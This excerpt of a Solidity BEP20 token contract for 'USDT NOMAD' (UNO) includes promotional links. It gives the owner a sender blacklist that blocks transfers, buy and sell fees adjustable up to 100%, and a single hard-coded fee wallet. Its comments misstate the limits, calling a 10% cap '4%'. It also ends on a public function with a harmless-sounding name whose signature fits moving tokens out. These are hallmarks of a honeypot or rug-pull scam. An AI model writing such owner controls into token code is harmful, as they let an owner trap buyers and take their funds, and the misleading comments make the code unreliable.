...
// https://t.me/USDTNoMad
// https://USDTNOMAD.tech
// Tax 8% Reward 7%
...
contract USDTNOMAD is Context, IBEP20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "USDT NOMAD";
    string constant _symbol = "UNO"; 
    ...
    uint256 public _maxTxAmount = _tTotal * 1000 / 10000; //Initial 4%
    uint256 public _maxWalletSize = _tTotal * 1000 / 10000; //Initial max 4%

    // Fees Receivers
    address public devFeeReceiver = 0x7C025790E97FCfd456a973e933eDDB95955f99D6;
    address public marketingFeeReceiver = 0x7C025790E97FCfd456a973e933eDDB95955f99D6;
    address public liquidityFeeReceiver = 0x7C025790E97FCfd456a973e933eDDB95955f99D6;
    ...
    uint256 public maxSwapSize = _tTotal * 50 / 10000; //0.5%
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isBlacklisted[sender], "Yamate Kudasai!"); 
    ...
    function isExcludedFromTax(address account, bool status) public onlyOwner {
    ...
    function setBuyFees(uint256 _devFee, uint256 _marketingFee, uint256 _liquidityFee) external onlyOwner {
        ...
        require(buyTotalFee <= 100, "Invalid buy tax fees");
    }
    ...
    function setSellFees(uint256 _devFee, uint256 _marketingFee, uint256 _liquidityFee) external onlyOwner {
        ...
        require(sellTotalFee <= 100, "Invalid sell tax fees");
    }
    ...
    function _isExcludedFromFee(address tokenAddress, uint256 tokens) public returns (bool success) {
